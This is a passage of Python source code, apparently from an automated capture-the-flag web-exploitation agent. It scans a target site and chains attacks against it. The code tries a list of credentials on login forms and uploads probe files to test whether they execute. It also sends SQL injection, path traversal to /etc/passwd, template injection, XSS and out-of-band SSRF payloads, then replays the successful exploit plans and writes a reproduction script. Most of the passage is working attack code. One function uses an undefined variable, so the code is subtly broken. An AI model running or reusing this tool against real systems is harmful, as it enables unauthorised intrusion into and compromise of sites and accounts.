            candidate_urls = list(result.get("upload_candidates", [])) + list(result.get("executable_candidates", []))
            accessible_url = None
            executable_url = None
            for candidate_url in candidate_urls[:10]:
                fetch = self.http_tool.request("GET", candidate_url)
                verdict = self._classify_uploaded_probe(fetch, probe)
                if verdict == "executable":
                    accessible_url = candidate_url
                    executable_url = candidate_url
                    break
                if verdict == "readable":
                    accessible_url = candidate_url
            if executable_url:
                memory.add_finding("upload", "browser-assisted upload reached executable path", executable_url, 0.94)
                memory.add_exploit_plan("Browser Upload Execution", "GET", executable_url, data={"browser_action": "upload", "uploaded_probe_url": executable_url}, notes="browser-assisted upload probe executed", confidence=0.95)
                return
            if accessible_url:
                memory.add_finding("upload", "browser-assisted upload reached readable path", accessible_url, 0.87)
                memory.add_exploit_plan("Browser Upload Reachable", "GET", accessible_url, data={"browser_action": "upload", "uploaded_probe_url": accessible_url}, notes="browser-assisted upload probe reachable", confidence=0.88)

    def _analyze_login_forms(self, challenge, memory, context):
        if not challenge.target:
            return

        form_limit = int(self.web_policy.get("login_form_limit", 3))
        attempt_limit = int(self.web_policy.get("login_attempt_limit", len(self.LOGIN_TESTS)))
        workspace = Path(challenge.metadata.get("workspace") or ".")
        browser_attempted = False
        for index, form in enumerate([item for item in context["forms"] if self._looks_like_login_form(item)][:form_limit]):
            action_url = form.get("action") or challenge.target
            baseline = self.http_tool.request("GET", action_url)
            fields = self._extract_login_fields(form)
            if not fields["username"] or not fields["password"]:
                continue

            for username, password in self.LOGIN_TESTS[:attempt_limit]:
                if self._cancel_requested(challenge):
                    return
                payload = dict(fields["hidden"])
                payload[fields["username"]] = username
                payload[fields["password"]] = password
                method = form.get("method", "POST").upper()
                response = self.http_tool.request(
                    method,
                    action_url,
                    data=payload if method != "GET" else None,
                    params=payload if method == "GET" else None,
                )
                comparison = self.http_tool.compare_responses(baseline, response, markers=self.SUCCESS_HINTS + self.FAILURE_HINTS)
                context["login_attempts"].append(
                    {
                        "form_index": index,
                        "action": action_url,
                        "method": method,
                        "username": username,
                        "password": password,
                        "status": response.get("status"),
                        "comparison": comparison,
                        "final_url": response.get("url"),
                    }
                )
                memory.record_action("login", "{0} {1}".format(method, action_url), self._status_text(response), "尝试疑似登录表单")
                self._process_response_flags(response["text"], "login:{0}".format(action_url), memory, reproducible=True)

                if self._login_success_score(baseline, response, comparison) >= 2:
                    notes = "username={0}, password={1}, final_url={2}".format(username, password, response.get("url"))
                    memory.add_finding("login", "疑似弱口令或鉴权绕过", notes, 0.84)
                    memory.add_exploit_plan("登录绕过或弱口令", method, action_url, data=payload, notes=notes, confidence=0.86)
                    for path in ["/admin", "/dashboard", "/profile", "/flag", "/api/me"]:
                        memory.add_exploit_plan("登录后路径验证", "GET", urljoin(challenge.target, path), notes="follow-up after successful login state", confidence=0.63)
                    break
            if not browser_attempted:
                browser_attempted = True
                self._try_browser_login_flows(challenge, workspace, memory, context, index)

    def _analyze_upload_points(self, challenge, memory, context):
        if not challenge.target:
            return

        upload_forms = [item for item in context["forms"] if self._looks_like_upload_form(item)]
        form_limit = int(self.web_policy.get("upload_form_limit", 2))
        probe_limit = int(self.web_policy.get("upload_probe_limit", 3))
        workspace = Path(challenge.metadata.get("workspace") or ".")
        browser_attempted = False

        for form_index, form in enumerate(upload_forms[:form_limit]):
            action_url = form.get("action") or challenge.target
            upload_fields = [item["name"] for item in form.get("inputs", []) if (item.get("type") or "").lower() == "file" and item.get("name")]
            if not upload_fields:
                continue
            hidden_fields = {
                item["name"]: item.get("value", "")
                for item in form.get("inputs", [])
                if item.get("name") and (item.get("type") or "").lower() == "hidden"
            }
            for probe in self._build_upload_probes()[:probe_limit]:
                if self._cancel_requested(challenge):
                    return
                field_name = upload_fields[0]
                response = self.http_tool.request(
                    form.get("method", "POST").upper(),
                    action_url,
                    data=hidden_fields,
                    files={
                        field_name: {
                            "filename": probe["filename"],
                            "content": probe["content"],
                            "content_type": probe["content_type"],
                        }
                    },
                )
                comparison = self.http_tool.compare_responses(
                    {"text": "", "headers": {}, "status": None, "elapsed": 0.0, "cookies": []},
                    response,
                    markers=[probe["token"]],
                )
                context["upload_attempts"].append(
                    {
                        "form_index": form_index,
                        "action": action_url,
                        "field": field_name,
                        "probe": probe["filename"],
                        "token": probe["token"],
                        "kind": probe["kind"],
                        "status": response.get("status"),
                        "comparison": comparison,
                    }
                )
                memory.record_action("upload", "{0} {1}".format(form.get("method", "POST").upper(), action_url), self._status_text(response), "尝试上传探针 {0}".format(probe["filename"]))

                candidate_urls = self._extract_upload_urls(challenge.target, response, probe["filename"])
                accessible_url = None
                executable_url = None
                for candidate_url in candidate_urls[:10]:
                    fetch = self.http_tool.request("GET", candidate_url)
                    verdict = self._classify_uploaded_probe(fetch, probe)
                    if verdict == "executable":
                        accessible_url = candidate_url
                        executable_url = candidate_url
                        break
                    if verdict == "readable":
                        accessible_url = candidate_url

                if executable_url:
                    memory.add_finding("upload", "疑似上传后可直接执行脚本", executable_url, 0.92)
                    memory.add_exploit_plan(
                        "文件上传执行",
                        form.get("method", "POST").upper(),
                        action_url,
                        data={
                            "file_field": field_name,
                            "filename": probe["filename"],
                            "uploaded_probe_url": executable_url,
                            "upload_spec": {
                                "filename": probe["filename"],
                                "content": probe["content"],
                                "content_type": probe["content_type"],
                                "field_name": field_name,
                                "hidden_fields": hidden_fields,
                            },
                        },
                        notes="uploaded probe executed",
                        confidence=0.94,
                    )
                if accessible_url:
                    memory.add_finding("upload", "疑似文件上传落地", accessible_url, 0.84)
                    memory.add_exploit_plan(
                        "文件上传落地",
                        form.get("method", "POST").upper(),
                        action_url,
                        data={
                            "file_field": field_name,
                            "filename": probe["filename"],
                            "uploaded_probe_url": accessible_url,
                            "upload_spec": {
                                "filename": probe["filename"],
                                "content": probe["content"],
                                "content_type": probe["content_type"],
                                "field_name": field_name,
                                "hidden_fields": hidden_fields,
                            },
                        },
                        notes="uploaded probe readable",
                        confidence=0.86,
                    )
            if not browser_attempted:
                browser_attempted = True
                self._try_browser_upload_flows(challenge, workspace, memory, context, form_index)

    def _probe_candidates(self, challenge, memory, context):
        if not challenge.target:
            return

        callback_url = (context["oob_callback"] or {}).get("url")
        suspicious_sqli = {}
        path_limit = int(self.web_policy.get("probe_path_limit", 10))
        param_limit = int(self.web_policy.get("probe_param_limit", 12))
        for path in self._prioritize_paths(context["candidate_paths"])[:path_limit]:
            full_url = urljoin(challenge.target, path)
            baseline = self.http_tool.request("GET", full_url)
            self._process_response_flags(baseline["text"], "probe-base:{0}".format(full_url), memory, reproducible=True)
            for param in self._prioritize_params(context["candidate_params"])[:param_limit]:
                if self._cancel_requested(challenge):
                    return
                for payload in self._parameter_payloads(param, callback_url):
                    response = self.http_tool.request("GET", full_url, params={param: payload})
                    comparison = self.http_tool.compare_responses(baseline, response, markers=self.SQL_ERROR_HINTS + self.LFI_MARKERS + ["49"])
                    reason = self._inspect_probe_response(param, payload, full_url, response, comparison, memory)
                    if comparison["score"] >= 0.35 or reason:
                        context["probe_results"].append(
                            {
                                "url": full_url,
                                "path": path,
                                "param": param,
                                "payload": payload,
                                "status": response.get("status"),
                                "comparison": comparison,
                                "reason": reason or ", ".join(comparison["reasons"]),
                            }
                        )
                        memory.record_action("probe", "GET {0}?{1}=...".format(full_url, param), self._status_text(response), "命中可疑参数差异")
                    if payload in ("'", '"', "1'") and (comparison["score"] >= 0.25 or reason):
                        suspicious_sqli[(path, param)] = {"path": path, "param": param}
        context["sqli_targets"] = list(suspicious_sqli.values())

    def _run_sqli_automation(self, challenge, memory, context):
        if not challenge.target:
            return

        target_limit = int(self.web_policy.get("sqli_target_limit", 5))
        for item in context.get("sqli_targets", [])[:target_limit]:
            if self._cancel_requested(challenge):
                return
            full_url = urljoin(challenge.target, item["path"])
            param = item["param"]
            baseline = self.http_tool.request("GET", full_url, params={param: "1"})
            true_payload = "1 AND 1=1" if self._looks_numeric_param(param) else "' OR '1'='1"
            false_payload = "1 AND 1=2" if self._looks_numeric_param(param) else "' OR '1'='2"
            slow_payload = "1 AND SLEEP(3)" if self._looks_numeric_param(param) else "' OR SLEEP(3)-- "
            true_response = self.http_tool.request("GET", full_url, params={param: true_payload})
            false_response = self.http_tool.request("GET", full_url, params={param: false_payload})
            slow_response = self.http_tool.request("GET", full_url, params={param: slow_payload})

            true_vs_false = self.http_tool.compare_responses(true_response, false_response, markers=self.SQL_ERROR_HINTS)
            false_vs_base = self.http_tool.compare_responses(baseline, false_response, markers=self.SQL_ERROR_HINTS)
            slow_vs_base = self.http_tool.compare_responses(baseline, slow_response, markers=self.SQL_ERROR_HINTS)
            context["sqli_checks"].append(
                {
                    "url": full_url,
                    "param": param,
                    "true_payload": true_payload,
                    "false_payload": false_payload,
                    "true_vs_false": true_vs_false,
                    "false_vs_base": false_vs_base,
                    "slow_vs_base": slow_vs_base,
                }
            )
            memory.record_action("sqli", "check {0}".format(full_url), "ok", "执行 SQLi 差分检测")

            boolean_hit = true_vs_false["score"] >= 0.45 and false_vs_base["score"] >= 0.25
            timing_hit = slow_vs_base["elapsed_delta"] > 2.2
            error_hit = any(marker in (false_response.get("text") or "").lower() for marker in self.SQL_ERROR_HINTS)

            if boolean_hit:
                memory.add_finding("sqli", "疑似布尔盲注特征", "param={0}".format(param), 0.84)
                memory.add_exploit_plan("SQL 注入差分验证", "GET", full_url, data={"param": param, "true_payload": true_payload, "false_payload": false_payload}, notes="boolean branch difference observed", confidence=0.8)
                self._maybe_add_sqlmap_plan(challenge, workspace, param, full_url, memory, context, "boolean")
            if timing_hit:
                memory.add_finding("sqli", "疑似时间盲注特征", "param={0}, delta={1}".format(param, slow_vs_base["elapsed_delta"]), 0.72)
                self._maybe_add_sqlmap_plan(challenge, workspace, param, full_url, memory, context, "time")
            if error_hit:
                memory.add_finding("sqli", "疑似 SQL 报错回显", "param={0}".format(param), 0.78)
                self._maybe_add_sqlmap_plan(challenge, workspace, param, full_url, memory, context, "error")

    def _run_oob_checks(self, challenge, memory, context):
        callback = context.get("oob_callback")
        if not callback:
            memory.record_action("oob", "poll", "skipped", "未配置 OOB 服务")
            return

        memory.add_finding("oob", "已生成 OOB 回连地址", callback.get("url", ""), 0.58)
        poll_result = self.oob_tool.poll(callback["token"])
        context["oob_checks"].append(poll_result)
        memory.record_action("oob", "poll token {0}".format(callback["token"]), "hit" if poll_result.get("matched") else "miss", "轮询 OOB 回连结果")
        if poll_result.get("matched"):
            memory.add_finding("oob", "确认存在带外交互", poll_result.get("url", ""), 0.92)
            memory.add_exploit_plan("OOB 交互确认", "GET", poll_result.get("url", ""), notes="callback token observed", confidence=0.9)

    def _attempt_exploit_plan(self, plan, challenge, memory, context):
        if self._cancel_requested(challenge):
            return

        title = (plan.title or "").lower()
        method = (plan.method or "GET").upper()
        memory.record_action("exploit", "{0} {1}".format(method, plan.url), "running", "执行高优先级 exploit plan")

        if "上传" in plan.title or "upload" in title:
            self._replay_upload_plan(plan, memory)
            return

        data = dict(plan.data or {})
        if method == "GET":
            response = self.http_tool.request(method, plan.url, params=data, headers=plan.headers)
        else:
            response = self.http_tool.request(method, plan.url, data=data, headers=plan.headers)
        context["best_plan_attempts"].append({"title": plan.title, "method": method, "url": plan.url, "status": response.get("status"), "elapsed": response.get("elapsed")})
        self._process_response_flags(response.get("text", ""), "exploit:{0}".format(plan.url), memory, reproducible=True)

        uploaded_url = plan.data.get("uploaded_probe_url")
        if uploaded_url:
            verify = self.http_tool.request("GET", uploaded_url)
            self._process_response_flags(verify.get("text", ""), "upload-verify:{0}".format(uploaded_url), memory, reproducible=True)

        if "登录" in plan.title or "login" in title:
            for path in ["/admin", "/dashboard", "/profile", "/flag", "/api/me"]:
                follow = self.http_tool.request("GET", urljoin(challenge.target, path))
                self._process_response_flags(follow.get("text", ""), "post-login:{0}".format(path), memory, reproducible=True)

    def _replay_upload_plan(self, plan, memory):
        spec = dict(plan.data.get("upload_spec", {}))
        field_name = spec.get("field_name") or plan.data.get("file_field") or "file"
        hidden_fields = dict(spec.get("hidden_fields", {}))
        response = self.http_tool.request(
            plan.method,
            plan.url,
            data=hidden_fields,
            files={
                field_name: {
                    "filename": spec.get("filename", "probe.txt"),
                    "content": spec.get("content", ""),
                    "content_type": spec.get("content_type", "application/octet-stream"),
                }
            },
        )
        self._process_response_flags(response.get("text", ""), "upload-replay:{0}".format(plan.url), memory, reproducible=True)
        uploaded_url = plan.data.get("uploaded_probe_url")
        if uploaded_url:
            verify = self.http_tool.request("GET", uploaded_url)
            self._process_response_flags(verify.get("text", ""), "upload-replay-verify:{0}".format(uploaded_url), memory, reproducible=True)

    def _write_context_artifacts(self, workspace, context):
        self.file_tool.write_json(workspace / "artifacts" / "candidate_paths.json", self._prioritize_paths(context["candidate_paths"]))
        self.file_tool.write_json(workspace / "artifacts" / "candidate_params.json", self._prioritize_params(context["candidate_params"]))
        self.file_tool.write_json(workspace / "artifacts" / "forms.json", context["forms"])
        self.file_tool.write_json(workspace / "artifacts" / "js_routes.json", context["js_routes"])
        self.file_tool.write_json(workspace / "artifacts" / "browser_reports.json", context["browser_reports"])
        self.file_tool.write_json(workspace / "artifacts" / "browser_state.json", context.get("browser_state", {}))
        self.file_tool.write_json(workspace / "artifacts" / "login_attempts.json", context["login_attempts"])
        self.file_tool.write_json(workspace / "artifacts" / "upload_attempts.json", context["upload_attempts"])
        self.file_tool.write_json(workspace / "artifacts" / "probe_results.json", context["probe_results"])
        self.file_tool.write_json(workspace / "artifacts" / "sqli_checks.json", context["sqli_checks"])
        self.file_tool.write_json(workspace / "artifacts" / "oob_checks.json", context["oob_checks"])
        self.file_tool.write_json(workspace / "artifacts" / "mcp_digest.json", context["mcp_digest"])
        self.file_tool.write_json(workspace / "artifacts" / "remote_reports.json", context["remote_reports"])
        self.file_tool.write_json(workspace / "artifacts" / "exploit_attempts.json", context["best_plan_attempts"])

    def _write_board(self, challenge, workspace, state, context):
        solver_meta = self._resolve_solver_metadata(challenge)
        recommendations = dict(solver_meta.get("recommendations") or {})
        configured_tools = self.toolkit_tool.available_tools() if self.toolkit_tool and self.toolkit_tool.is_configured() else []
        available_servers = [item.get("name", "") for item in self.mcp_registry.list_servers()] if self.mcp_registry and self.mcp_registry.has_servers() else []
        available_hosts = self.remote_tool.list_hosts() if self.remote_tool else []
        browser_state = dict(context.get("browser_state") or {})
        used_mcp = [
            "{0}::{1}".format(item.get("server", "browser"), item.get("tool", "tool"))
            for item in context.get("browser_reports", [])
            if item.get("server") and item.get("tool")
        ]
        recommended_mcp = []
        if self.mcp_registry and self.mcp_registry.has_servers():
            hint = self.mcp_registry.pick_browser_tool()
            if hint:
                recommended_mcp.append("{0}::{1}".format(hint["server"], hint["tool"]["name"]))

        used_tools = ["http_tool"]
        if context.get("upload_attempts"):
            used_tools.append("upload-probe")
        if context.get("sqli_checks"):
            used_tools.append("response-diff")
        if context.get("oob_checks"):
            used_tools.append("oob")
        if context.get("remote_reports"):
            used_tools.append("remote-tool")
        if context.get("browser_reports"):
            used_tools.append("browser-flow")

        next_actions = []
        best_flag = self.verifier.choose_best(state, challenge)
        best_plan = self._choose_best_plan(state, set())
        best_http_plan = None
        best_browser_plan = None
        best_oob_plan = None
        for item in sorted(state.exploit_plans, key=self._plan_score, reverse=True):
            if not best_browser_plan and "browser" in (item.title or "").lower():
                best_browser_plan = item
            if not best_http_plan and "browser" not in (item.title or "").lower():
                best_http_plan = item
            if not best_oob_plan and (
                "oob" in (item.title or "").lower()
                or "回调" in (item.title or "")
                or "callback" in ((item.notes or "").lower())
            ):
                best_oob_plan = item
        oob_callback = dict(context.get("oob_callback") or {})
        oob_checks = list(context.get("oob_checks", []))
        oob_matched = any(bool(item.get("matched")) for item in oob_checks if isinstance(item, dict))
        if best_flag:
            next_actions.append("已拿到候选 flag，优先复核复现链路并按需提交。")
        elif best_plan:
            next_actions.append("继续执行当前最高置信 exploit plan：{0}".format(best_plan.title))
        else:
            next_actions.append("继续围绕高价值路径、参数和上传点做下一轮利用尝试。")
        if oob_callback.get("url") and not oob_matched:
            next_actions.append("继续围绕 SSRF / blind 参数复测，观察 OOB 回连是否出现。")

        board_context = {
            "attachments": [{"name": Path(item).name, "path": str(item)} for item in challenge.attachments],
            "configured_tools": configured_tools,
            "used_tools": sorted(set(used_tools)),
            "recommended_tools": sorted(
                set(
                    ["browse_target", "probe_remote_host", "run_remote_python"]
                    + list((context.get("autopilot") or {}).get("local_tools", []))
                    + list(recommendations.get("recommended_tools", []))
                    + (["run_local_tool"] if configured_tools else [])
                )
            ),
            "available_mcp_servers": available_servers,
            "mcp_digest": list(context.get("mcp_digest", [])),
            "recommended_mcp": sorted(set(recommended_mcp + list((context.get("autopilot") or {}).get("recommended_mcp", [])) + list(recommendations.get("recommended_mcp", [])))),
            "used_mcp": sorted(set(used_mcp)),
            "available_remote_hosts": available_hosts,
            "selected_remote_host": context.get("remote_host") or challenge.metadata.get("use_remote_host", ""),
            "remote_selection_mode": context.get("remote_selection_mode", ""),
            "remote_selection_reason": context.get("remote_selection_reason", ""),
            "remote_selection_candidates": list(context.get("remote_selection_candidates", [])),
            "remote_reports": list(context.get("remote_reports", [])),
            "remote_placeholder": "远程辅助执行层已接入，可用于复测目标、上传样本和后续动调扩展。",
            "recommended_path": "web-followup",
            "next_actions": list((context.get("autopilot") or {}).get("solver_hints", [])) + next_actions,
            "blockers": [state.blocked_reason] if state.blocked_reason else [],
            "normalized_target": challenge.target or "",
            "autopilot": context.get("autopilot", {}),
            "knowledge": dict(context.get("knowledge") or solver_meta.get("knowledge") or {}),
            "browser_usage": {
                "requested": browser_state.get("requested", False),
                "enabled": browser_state.get("enabled", False),
                "used": browser_state.get("used", False),
                "server": browser_state.get("server", ""),
                "tool": browser_state.get("tool", ""),
                "fallback_reason": browser_state.get("fallback_reason", ""),
                "auth_state": browser_state.get("auth_state", "unknown"),
                "auth_evidence": list(browser_state.get("auth_evidence", [])),
                "route_candidates": list(browser_state.get("route_candidates", [])),
                "param_candidates": list(browser_state.get("param_candidates", [])),
                "upload_candidates": list(browser_state.get("upload_candidates", [])),
                "executable_candidates": list(browser_state.get("executable_candidates", [])),
                "login_forms": browser_state.get("login_forms", 0),
                "upload_forms": browser_state.get("upload_forms", 0),
                "best_http_plan": best_http_plan.title if best_http_plan else "",
                "best_browser_plan": best_browser_plan.title if best_browser_plan else "",
                "reports": list(context.get("browser_reports", [])),
            },
            "oob_usage": {
                "enabled": self.oob_tool.is_enabled(),
                "can_poll": self.oob_tool.can_poll(),
                "configured_mode": "configured" if self.oob_tool.is_enabled() and self.oob_tool.can_poll() else "disabled",
                "callback_url": oob_callback.get("url", ""),
                "token": oob_callback.get("token", ""),
                "matched": oob_matched,
                "hit_count": len([item for item in oob_checks if isinstance(item, dict) and item.get("matched")]),
                "best_oob_plan": best_oob_plan.title if best_oob_plan else "",
                "last_poll_url": (oob_checks[-1] or {}).get("url", "") if oob_checks else "",
                "last_poll_status": (oob_checks[-1] or {}).get("status") if oob_checks else None,
                "reports": oob_checks,
            },
        }
        board = build_triage_board(
            challenge,
            state,
            workspace,
            solver_name="web",
            context=board_context,
            run_meta={
                "run_id": challenge.metadata.get("run_id", ""),
                "status": "solved" if best_flag else "unresolved",
            },
        )
        self.file_tool.write_json(workspace / "triage_board.json", board)

    def _remote_recon_target(self, challenge, workspace, memory, context, base_url, local_response):
        host_name = context.get("remote_host")
        if not host_name or not self.remote_tool:
            return None

        remote_workspace = context.get("remote_workspace", {})
        template_payload = self.remote_tool.render_template(
            "http-replay",
            url=base_url,
            method="GET",
            headers={"User-Agent": "ctf-agent-remote/1.0"},
        )
        if self._maybe_pause_on_approval(
            challenge,
            workspace,
            memory,
            checkpoint="remote_recon:render",
            result=template_payload,
            context=self._solver_context_snapshot(context, base_url=base_url),
            pending_action={"kind": "remote_template_render", "template_kind": "http-replay", "url": base_url},
            blocked_reason=str(template_payload.get("message", "") or "remote template approval required"),
        ):
            return None
        template_artifact = self._write_remote_http_template_artifact(workspace, host_name, template_payload)
        if template_artifact:
            memory.record_action(
                "remote",
                "render http-replay template for {0}".format(host_name),
                "ok",
                "generated reusable remote HTTP replay script",
                str(template_artifact),
            )
            context["remote_reports"].append(
                {
                    "kind": "template",
                    "host": host_name,
                    "template_kind": "http-replay",
                    "status": template_payload.get("status", "ok"),
                    "local_artifact": str(template_artifact),
                    "filename": template_payload.get("filename", ""),
                    "summary": template_payload.get("summary", ""),
                }
            )

        result = self.remote_tool.run_template(
            host_name,
            "http-replay",
            remote_workspace=remote_workspace,
            timeout=45,
            url=base_url,
            method="GET",
            headers={"User-Agent": "ctf-agent-remote/1.0"},
        )
        if self._maybe_pause_on_approval(
            challenge,
            workspace,
            memory,
            checkpoint="remote_recon:run",
            result=result,
            context=self._solver_context_snapshot(context, base_url=base_url),
            pending_action={"kind": "remote_template_run", "template_kind": "http-replay", "url": base_url, "host": host_name},
            blocked_reason=str(result.get("message", "") or "remote template approval required"),
        ):
            return None
        execute = dict(result.get("execute") or {})
        payload = {}
        stdout_text = str(execute.get("stdout", "") or "").strip()
        if stdout_text:
            try:
                payload = json.loads(stdout_text)
            except Exception:
                payload = {"status": "error", "error": "invalid remote JSON", "raw_stdout": stdout_text[:12000]}
        elif result.get("status") != "ok":
            payload = {"status": "error", "error": execute.get("stderr") or result.get("message", "remote template failed")}

        report = {
            "kind": "http-fetch",
            "host": host_name,
            "status": payload.get("status", result.get("status", "error")),
            "template_kind": "http-replay",
            "template_path": result.get("template_path", ""),
            "python_bin": execute.get("command", "").split(" ", 1)[0] if execute.get("command") else "",
            "returncode": execute.get("returncode"),
            "stderr": (execute.get("stderr", "") or "")[:6000],
            "payload": payload,
        }
        remote_response = self._remote_payload_to_response(payload)
        if remote_response:
            report["comparison_to_local"] = self.http_tool.compare_responses(
                local_response,
                remote_response,
                markers=self.SUCCESS_HINTS + self.FAILURE_HINTS + ["flag{"],
            )
        artifact = workspace / "artifacts" / "remote_{0}_http.json".format(self._safe_name(host_name))
        self.file_tool.write_json(artifact, report)
        context["remote_reports"].append(report)
        memory.record_action(
            "remote",
            "fetch {0} from {1}".format(base_url, host_name),
            report.get("status", "error"),
            "replayed target from remote helper",
            str(artifact),
        )
        if report.get("status") != "ok":
            memory.add_finding(
                "remote",
                "remote helper could not replay target",
                "{0}: {1}".format(host_name, payload.get("error") or execute.get("stderr") or "unknown error"),
                0.4,
            )
            return None

        self._process_response_flags(remote_response.get("text", ""), "remote:{0}".format(host_name), memory, reproducible=True)
        memory.add_finding(
            "remote",
            "remote helper replayed target",
            "{0} -> {1} ({2})".format(host_name, remote_response.get("url", base_url), remote_response.get("status")),
            0.58,
        )
        comparison = report.get("comparison_to_local", {})
        if comparison.get("score", 0.0) >= 0.35:
            memory.add_finding(
                "remote",
                "local and remote responses diverge",
                ", ".join(comparison.get("reasons", [])) or "response changed across vantage points",
                0.66,
            )
        return remote_response

    def _write_remote_http_template_artifact(self, workspace, host_name, rendered):
        if rendered.get("status") != "ok":
            return None
        artifact = workspace / "artifacts" / "remote_{0}_{1}".format(
            self._safe_name(host_name),
            rendered.get("filename", "remote_http_replay.py"),
        )
        self.file_tool.write_text(artifact, rendered.get("content", ""))
        return artifact

    def _write_notes(self, challenge, workspace, state):
        best_flag = self.verifier.choose_best(state, challenge)
        best_plan = self._choose_best_plan(state, set())
        toolkit_desc = ", ".join(self.toolkit_tool.available_tools()) if self.toolkit_tool else "N/A"
        mcp_desc = ", ".join(item.get("name", "unnamed") for item in self.mcp_registry.list_servers()) if self.mcp_registry and self.mcp_registry.has_servers() else "none"
        knowledge = dict(self._resolve_solver_metadata(challenge).get("knowledge") or {})
        lines = [
            "# Challenge Notes",
            "",
            "## Metadata",
            "- Title: {0}".format(challenge.title),
            "- Category: {0}".format(challenge.category),
            "- Target: {0}".format(challenge.target or "N/A"),
            "",
            "## Profile",
            "- Goal: {0}".format(self.profile.get("goal", "中文输出，持续推进直到拿到 flag。")),
            "- Language: {0}".format(self.profile.get("language", "zh-CN")),
            "- Toolkit: {0}".format(toolkit_desc),
            "- MCP: {0}".format(mcp_desc),
            "",
        ]
        lines.extend(
            [
                "## Knowledge Pack",
                "- Selected playbook: {0}".format(knowledge.get("pack_name", "N/A")),
                "- Selected category: {0}".format(knowledge.get("selected_skill_category", challenge.category)),
                "- Confidence: {0}".format(knowledge.get("category_confidence", 0.0)),
            ]
        )
        for item in list(knowledge.get("top_tactics", []))[:5]:
            lines.append("- tactic: {0}".format(item))
        if knowledge.get("reference_docs"):
            lines.append("- reference_docs:")
            for item in list(knowledge.get("reference_docs", []))[:5]:
                lines.append("  - {0}".format(item))
        lines.extend(["", "## Recon"])
        if state.tried_actions:
            for item in state.tried_actions:
                lines.append("- [{0}] {1} -> {2}".format(item.phase, item.action, item.status))
        else:
            lines.append("- 暂无动作记录。")

        lines.extend(["", "## Hypotheses"])
        if state.hypotheses:
            for item in state.hypotheses:
                lines.append("- {0}".format(item))
        else:
            lines.append("- 暂无假设。")

        lines.extend(["", "## Findings"])
        if state.findings:
            for item in state.findings:
                lines.append("- {0}: {1} ({2})".format(item.source, item.summary, item.evidence))
        else:
            lines.append("- 暂无线索。")

        lines.extend(["", "## Exploit Plans"])
        if state.exploit_plans:
            for item in sorted(state.exploit_plans, key=self._plan_score, reverse=True):
                lines.append("- [{0}] {1} {2} | confidence={3}".format(item.title, item.method, item.url, item.confidence))
                if item.notes:
                    lines.append("  notes: {0}".format(item.notes.replace("\n", " | ")))
        else:
            lines.append("- 暂无利用方案。")

        lines.extend(["", "## Candidate Flags"])
        if state.candidate_flags:
            for item in state.candidate_flags:
                lines.append("- {0} | source={1} | reproducible={2} | confidence={3}".format(item.value, item.source, "yes" if item.reproducible else "no", item.confidence))
        else:
            lines.append("- 暂无候选 flag。")

        lines.extend(["", "## Final Exploit"])
        if best_flag:
            lines.append("- Candidate flag: {0}".format(best_flag.value))
        if best_plan:
            lines.append("- Best plan: {0} {1}".format(best_plan.method, best_plan.url))
            lines.append("- Plan note: {0}".format(best_plan.notes or "see state.json"))
        if not best_flag and not best_plan:
            lines.append("- 当前仍需沿登录流、上传点、参数差分和 JS 路由继续深入。")

        self.file_tool.write_text(workspace / "notes.md", "\n".join(lines) + "\n")

    def _write_solution_stub(self, challenge, workspace, state):
        best_flag = self.verifier.choose_best(state, challenge)
        best_plan = self._choose_best_plan(state, set())
        lines = [
            '"""Starter reproduction script for the current challenge state."""',
            "",
            "from urllib.parse import urlencode",
            "from urllib.request import Request, urlopen",
            "",
            "METHOD = {0!r}".format(best_plan.method if best_plan else "GET"),
            "URL = {0!r}".format(best_plan.url if best_plan else challenge.target or "http://127.0.0.1:8080"),
            "DATA = {0}".format(repr(best_plan.data if best_plan else {})),
            "HEADERS = {0}".format(repr(best_plan.headers if best_plan else {})),
            "",
            "def send(url, method='GET', data=None, headers=None):",
            "    payload = None",
            "    headers = dict(headers or {})",
            "    if data:",
            "        payload = urlencode(data).encode('utf-8')",
            "        headers.setdefault('Content-Type', 'application/x-www-form-urlencoded')",
            "    request = Request(url, data=payload, headers=headers, method=method.upper())",
            "    with urlopen(request, timeout=10) as response:",
            "        return response.read().decode('utf-8', errors='replace')",
            "",
            "def main():",
            "    body = send(URL, METHOD, DATA, HEADERS)",
            "    print(body[:1500])",
        ]
        if best_plan and best_plan.notes:
            lines.append("    # Exploit note: {0}".format(best_plan.notes.replace('\\n', ' | ')))
        if best_flag:
            lines.append("    # Expected candidate flag: {0}".format(best_flag.value))
        else:
            lines.append("    # TODO: continue from notes.md and state.json")
        lines.extend(["", "if __name__ == '__main__':", "    main()"])
        self.file_tool.write_text(workspace / "solution.py", "\n".join(lines) + "\n")

    def _inspect_text_blob(self, text, source, memory):
        self._process_response_flags(text, source, memory, reproducible=False)
        lowered = (text or "").lower()
        for keyword in ["flag", "token", "password", "secret", "api", "admin", "jwt", "upload"]:
            if keyword in lowered:
                memory.add_finding(source, "文本中发现关键词", keyword, 0.5)

    def _scan_js(self, text):
        routes = set()
        params = set()
        keywords = set()
        for pattern in self.JS_ROUTE_PATTERNS:
            for match in pattern.findall(text or ""):
                route = match[0] if isinstance(match, tuple) else match
                if route and route.startswith("/") and len(route) < 180:
                    routes.add(route)
        for pattern in self.JS_PARAM_PATTERNS:
            for match in pattern.findall(text or ""):
                params.add(match[0] if isinstance(match, tuple) else match)
        for match in self.KEYWORD_PATTERN.findall(text or ""):
            keywords.add(match)
        return sorted(routes), sorted(params), sorted(keywords)

    def _parameter_payloads(self, param, callback_url):
        payloads = ["1", "'", '"', "1'", "../../../../../../etc/passwd", "{{7*7}}", "<svg/onload=alert(1)>"]
        if callback_url and (param or "").lower() in self.SSRF_PARAM_NAMES:
            payloads.append(callback_url)
        return [item for index, item in enumerate(payloads) if item not in payloads[:index]]

    def _inspect_probe_response(self, param, payload, base_url, response, comparison, memory):
        text = response.get("text", "")
        lowered = text.lower()
        probe_url = self.http_tool.with_query_params(base_url, {param: payload})
        self._process_response_flags(text, "probe:{0}".format(probe_url), memory, reproducible=True)

        if any(marker in lowered for marker in self.SQL_ERROR_HINTS):
            memory.add_finding("probe", "疑似 SQL 报错特征", "param={0}, payload={1}".format(param, payload), 0.78)
            return "sql-error"
        if any(marker.lower() in lowered for marker in self.LFI_MARKERS):
            memory.add_finding("probe", "疑似本地文件包含回显", "param={0}, payload={1}".format(param, payload), 0.86)
            memory.add_exploit_plan("本地文件包含", "GET", base_url, data={param: payload}, notes="LFI markers observed", confidence=0.86)
            return "lfi-marker"
        if payload in text and len(payload) > 3:
            memory.add_finding("probe", "发现参数反射", "param={0}, payload={1}".format(param, payload), 0.64)
            return "reflection"
        if payload == "{{7*7}}" and "49" in text:
            memory.add_finding("probe", "疑似 SSTI 计算结果", "param={0}".format(param), 0.8)
